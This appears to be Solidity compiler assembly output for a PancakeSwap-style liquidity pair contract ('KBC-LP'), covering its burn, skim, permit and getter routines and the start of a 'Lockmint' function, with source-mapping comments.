swap2\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"Pair.sol\":9136:9176  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":9197:9222  IERC20(_token1).balanceOf */\n      dup7\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_258\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_258:\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_259\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_259:\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_260\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_260:\n      pop\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      mload\n      swap4\n      pop\n        /* \"Pair.sol\":9248:9297  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_261\n        /* \"Pair.sol\":9256:9264  balance0 */\n      dup6\n        /* \"Pair.sol\":9197:9237  IERC20(_token1).balanceOf(address(this)) */\n      dup6\n        /* \"Pair.sol\":9276:9285  _reserve0 */\n      dup12\n        /* \"Pair.sol\":9287:9296  _reserve1 */\n      dup12\n        /* \"Pair.sol\":9248:9255  _update */\n      tag_186\n        /* \"Pair.sol\":9248:9297  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_261:\n        /* \"Pair.sol\":9311:9316  feeOn */\n      dup2\n        /* \"Pair.sol\":9307:9354  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n      iszero\n      tag_262\n      jumpi\n        /* \"Pair.sol\":9345:9353  reserve1 */\n      sload(0x0b)\n        /* \"Pair.sol\":9326:9354  uint(reserve0).mul(reserve1) */\n      tag_263\n      swap1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":9331:9339  reserve0 */\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"Pair.sol\":9345:9353  reserve1 */\n      swap1\n      div\n      and\n        /* \"Pair.sol\":9326:9354  uint(reserve0).mul(reserve1) */\n      0xffffffff\n        /* \"Pair.sol\":9326:9344  uint(reserve0).mul */\n      tag_175\n        /* \"Pair.sol\":9326:9354  uint(reserve0).mul(reserve1) */\n      and\n      jump\t// in\n    tag_263:\n        /* \"Pair.sol\":9318:9323  kLast */\n      0x0e\n        /* \"Pair.sol\":9318:9354  kLast = uint(reserve0).mul(reserve1) */\n      sstore\n        /* \"Pair.sol\":9307:9354  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n    tag_262:\n        /* \"Pair.sol\":9409:9447  Burn(msg.sender, amount0, amount1, to) */\n      0x40\n      dup1\n      mload\n      dup13\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup13\n      swap1\n      mstore\n      dup2\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup16\n      and\n      swap3\n        /* \"Pair.sol\":9414:9424  msg.sender */\n      caller\n      swap3\n        /* \"Pair.sol\":9409:9447  Burn(msg.sender, amount0, amount1, to) */\n      0xdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496\n      swap3\n      swap1\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"Pair.sol\":1270:1271  _ */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Pair.sol\":1292:1293  1 */\n      0x01\n        /* \"Pair.sol\":1281:1289  unlocked */\n      0x10\n        /* \"Pair.sol\":1281:1293  unlocked = 1 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"Pair.sol\":8025:9454  function burn(... */\n      swap2\n      pop\n      swap2\n      jump\t// out\n        /* \"Pair.sol\":1114:1134  address public owner */\n    tag_101:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x0f))\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n    tag_103:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x06))\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":220:260  string public constant symbol = \"KBC-LP\" */\n    tag_105:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xd4, 0x04b42432d4c5)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_112:\n        /* \"ERC20.sol\":3026:3030  bool */\n      0x00\n        /* \"ERC20.sol\":3042:3074  _transfer(msg.sender, to, value) */\n      tag_189\n        /* \"ERC20.sol\":3052:3062  msg.sender */\n      caller\n        /* \"ERC20.sol\":3064:3066  to */\n      dup5\n        /* \"ERC20.sol\":3068:3073  value */\n      dup5\n        /* \"ERC20.sol\":3042:3051  _transfer */\n      tag_197\n        /* \"ERC20.sol\":3042:3074  _transfer(msg.sender, to, value) */\n      jump\t// in\n        /* \"Pair.sol\":402:450  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n    tag_114:\n        /* \"Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"Pair.sol\":402:450  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":18077:18498  function skim(address to) external lock {... */\n    tag_117:\n        /* \"Pair.sol\":1205:1213  unlocked */\n      sload(0x10)\n        /* \"Pair.sol\":1217:1218  1 */\n      0x01\n        /* \"Pair.sol\":1205:1218  unlocked == 1 */\n      eq\n        /* \"Pair.sol\":1197:1238  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_267\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_267:\n        /* \"Pair.sol\":1259:1260  0 */\n      0x00\n        /* \"Pair.sol\":1248:1256  unlocked */\n      0x10\n        /* \"Pair.sol\":1248:1260  unlocked = 0 */\n      sstore\n        /* \"Pair.sol\":18145:18151  token0 */\n      sload(0x08)\n        /* \"Pair.sol\":18194:18200  token1 */\n      sload(0x09)\n        /* \"Pair.sol\":18334:18342  reserve0 */\n      sload(0x0b)\n        /* \"Pair.sol\":18289:18329  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":18323:18327  this */\n      address\n        /* \"Pair.sol\":18289:18329  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":18145:18151  token0 */\n      swap5\n      dup6\n      and\n      swap5\n        /* \"Pair.sol\":18194:18200  token1 */\n      swap1\n      swap4\n      and\n      swap3\n        /* \"Pair.sol\":18225:18353  _safeTransfer(... */\n      tag_269\n      swap3\n        /* \"Pair.sol\":18145:18151  token0 */\n      dup6\n      swap3\n        /* \"Pair.sol\":18273:18275  to */\n      dup8\n      swap3\n        /* \"Pair.sol\":18289:18343  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      tag_270\n      swap3\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":18334:18342  reserve0 */\n      and\n      swap2\n        /* \"Pair.sol\":18145:18151  token0 */\n      dup6\n      swap2\n        /* \"Pair.sol\":18289:18314  IERC20(_token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":18289:18329  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n      0x20\n      swap3\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":18145:18151  token0 */\n      dup7\n        /* \"Pair.sol\":18289:18329  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_271\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_271:\n        /* \"Pair.sol\":18289:18329  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_272\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_272:\n        /* \"Pair.sol\":18289:18329  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_273\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_273:\n      pop\n        /* \"Pair.sol\":18289:18329  IERC20(_token0).balanceOf(address(this)) */\n      mload\n      swap1\n        /* \"Pair.sol\":18289:18343  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      0xffffffff\n        /* \"Pair.sol\":18289:18333  IERC20(_token0).balanceOf(address(this)).sub */\n      tag_177\n        /* \"Pair.sol\":18289:18343  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      and\n      jump\t// in\n    tag_270:\n        /* \"Pair.sol\":18225:18238  _safeTransfer */\n      tag_149\n        /* \"Pair.sol\":18225:18353  _safeTransfer(... */\n      jump\t// in\n    tag_269:\n        /* \"Pair.sol\":18472:18480  reserve1 */\n      sload(0x0b)\n        /* \"Pair.sol\":18427:18467  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":18461:18465  this */\n      address\n        /* \"Pair.sol\":18427:18467  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":18363:18491  _safeTransfer(... */\n      tag_274\n      swap3\n        /* \"Pair.sol\":18390:18397  _token1 */\n      dup5\n      swap3\n        /* \"Pair.sol\":18411:18413  to */\n      dup8\n      swap3\n        /* \"Pair.sol\":18427:18481  IERC20(_token1).balanceOf(address(this)).sub(reserve1) */\n      tag_270\n      swap3\n      shl(0x70, 0x01)\n        /* \"Pair.sol\":18472:18480  reserve1 */\n      swap1\n      div\n      sub(shl(0x70, 0x01), 0x01)\n      and\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":18427:18452  IERC20(_token1).balanceOf */\n      dup7\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":18427:18467  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n      0x20\n      swap3\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":18427:18452  IERC20(_token1).balanceOf */\n      dup7\n        /* \"Pair.sol\":18427:18467  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_271\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"Pair.sol\":18363:18491  _safeTransfer(... */\n    tag_274:\n      pop\n      pop\n        /* \"Pair.sol\":1292:1293  1 */\n      0x01\n        /* \"Pair.sol\":1281:1289  unlocked */\n      0x10\n        /* \"Pair.sol\":1281:1293  unlocked = 1 */\n      sstore\n      pop\n        /* \"Pair.sol\":18077:18498  function skim(address to) external lock {... */\n      jump\t// out\n        /* \"Pair.sol\":559:581  address public factory */\n    tag_119:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x07))\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":614:635  address public token1 */\n    tag_121:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x09))\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n    tag_124:\n        /* \"ERC20.sol\":3688:3703  block.timestamp */\n      timestamp\n        /* \"ERC20.sol\":3676:3684  deadline */\n      dup5\n        /* \"ERC20.sol\":3676:3703  deadline >= block.timestamp */\n      lt\n      iszero\n        /* \"ERC20.sol\":3668:3724  require(deadline >= block.timestamp, \"Pancake: EXPIRED\") */\n      tag_280\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x10\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x82, 0x14185b98d85ad94e8811561412549151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_280:\n        /* \"ERC20.sol\":3836:3852  DOMAIN_SEPARATOR */\n      sload(0x04)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4073:4086  nonces[owner] */\n      dup1\n      dup10\n      and\n        /* \"ERC20.sol\":3734:3748  bytes32 digest */\n      0x00\n        /* \"ERC20.sol\":4073:4086  nonces[owner] */\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":4073:4079  nonces */\n      0x05\n        /* \"ERC20.sol\":4073:4086  nonces[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":4073:4088  nonces[owner]++ */\n      dup1\n      sload\n      0x01\n      dup1\n      dup3\n      add\n      swap1\n      swap3\n      sstore\n        /* \"ERC20.sol\":3901:4144  abi.encode(... */\n      dup3\n      mload\n        /* \"ERC20.sol\":706:772  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"ERC20.sol\":3901:4144  abi.encode(... */\n      dup2\n      dup7\n      add\n      mstore\n      dup1\n      dup5\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      swap6\n      dup14\n      and\n      0x60\n      dup7\n      add\n      mstore\n      0x80\n      dup6\n      add\n      dup13\n      swap1\n      mstore\n      0xa0\n      dup6\n      add\n      swap6\n      swap1\n      swap6\n      mstore\n      0xc0\n      dup1\n      dup6\n      add\n      dup12\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup7\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"ERC20.sol\":3901:4144  abi.encode(... */\n      0xe0\n      dup6\n      add\n      dup3\n      mstore\n        /* \"ERC20.sol\":3870:4162  keccak256(... */\n      dup1\n      mload\n      swap1\n      dup4\n      add\n      keccak256\n      shl(0xf0, 0x1901)\n        /* \"ERC20.sol\":3774:4176  abi.encodePacked(... */\n      0x0100\n      dup7\n      add\n      mstore\n      0x0102\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      0x0122\n      dup1\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      dup1\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup6\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap7\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup7\n      mstore\n        /* \"ERC20.sol\":3774:4176  abi.encodePacked(... */\n      0x0142\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n        /* \"ERC20.sol\":3751:4186  keccak256(... */\n      dup7\n      mload\n      swap7\n      dup4\n      add\n      swap7\n      swap1\n      swap7\n      keccak256\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      swap6\n      dup4\n      swap1\n      mstore\n      0x0162\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n      dup7\n      swap1\n      mstore\n      0xff\n      dup10\n      and\n      0x0182\n      dup6\n      add\n      mstore\n      0x01a2\n      dup5\n      add\n      dup9\n      swap1\n      mstore\n      0x01c2\n      dup5\n      add\n      dup8\n      swap1\n      mstore\n      mload\n        /* \"ERC20.sol\":3734:3748  bytes32 digest */\n      swap2\n      swap4\n        /* \"ERC20.sol\":4073:4088  nonces[owner]++ */\n      swap3\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      0x01e2\n      dup1\n      dup3\n      add\n      swap4\n      not(0x1f)\n      dup2\n      add\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n        /* \"ERC20.sol\":4073:4088  nonces[owner]++ */\n      dup6\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_281\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_281:\n      pop\n      pop\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      mload(add(not(0x1f), mload(0x40)))\n      swap2\n      pop\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4280:4310  recoveredAddress != address(0) */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"ERC20.sol\":4280:4339  recoveredAddress != address(0) && recoveredAddress == owner */\n      tag_282\n      jumpi\n      pop\n        /* \"ERC20.sol\":4334:4339  owner */\n      dup9\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4314:4339  recoveredAddress == owner */\n      and\n        /* \"ERC20.sol\":4314:4330  recoveredAddress */\n      dup2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4314:4339  recoveredAddress == owner */\n      and\n      eq\n        /* \"ERC20.sol\":4280:4339  recoveredAddress != address(0) && recoveredAddress == owner */\n    tag_282:\n        /* \"ERC20.sol\":4259:4391  require(... */\n      tag_283\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1a\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e56414c49445f5349474e4154555245000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_283:\n        /* \"ERC20.sol\":4401:4432  _approve(owner, spender, value) */\n      tag_284\n        /* \"ERC20.sol\":4410:4415  owner */\n      dup10\n        /* \"ERC20.sol\":4417:4424  spender */\n      dup10\n        /* \"ERC20.sol\":4426:4431  value */\n      dup10\n        /* \"ERC20.sol\":4401:4409  _approve */\n      tag_190\n        /* \"ERC20.sol\":4401:4432  _approve(owner, spender, value) */\n      jump\t// in\n    tag_284:\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"Pair.sol\":6635:7916  function Lockmint(address to) external lock returns (uint liquidity) {... */\n    tag_127:\n        /* \"Pair.sol\":6688:6702  uint liquidity */\n      0x00\n        /* \"Pair.sol\":1205:1213  unlocked */\n      sload(0x10)\n        /* \"Pair.sol\":1217:1218  1 */\n      0x01\n        /* \"Pair.sol\":1205:1218  unlocked == 1 */\n      eq\n        /* \"Pair.sol\":1197:1238  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_286\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_286:\n        /* \"Pair.sol\":1259:1260  0 */\n      0x00\n        /* \"Pair.sol\":1248:1256  unlocked */\n      0x10\n        /* \"Pair.sol\":1248:1260  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"Pair.sol\":1259:1260  0 */\n      dup1\n        /* \"Pair.sol\":6757:6770  getReserves() */\n      tag_288\n        /* \"Pair.sol\":6757:6768  getReserves */\n      tag_56\n        /* \"Pair.sol\":6757:6770  getReserves() */\n      jump\t// in\n    tag_288:\n      pop\n        /* \"Pair.sol\":6818:6824  token0 */\n      sload(0x08)\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":6844:6848  this */\n      address\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":6714:6770  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap4\n      swap6\n      pop\n      swap2\n      swap4\n      pop\n        /* \"Pair.sol\":6795:6808  uint balance0 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":6818:6824  token0 */\n      swap1\n      swap2\n      and\n      swap2\n        /* \"Pair.sol\":6811:6835  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":6818:6824  token0 */\n      dup7\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_289\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_289:\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_290\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_290:\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_291\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_291:\n      pop\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":6883:6889  token1 */\n      sload(0x09)\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":6909:6913  this */\n      address\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      swap3\n      swap4\n      pop\n        /* \"Pair.sol\":6860:6873  uint balance1 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":6883:6889  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"Pair.sol\":6876:6900  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":6883:6889  token1 */\n      dup7\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_292\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_292:\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_293\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_293:\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* 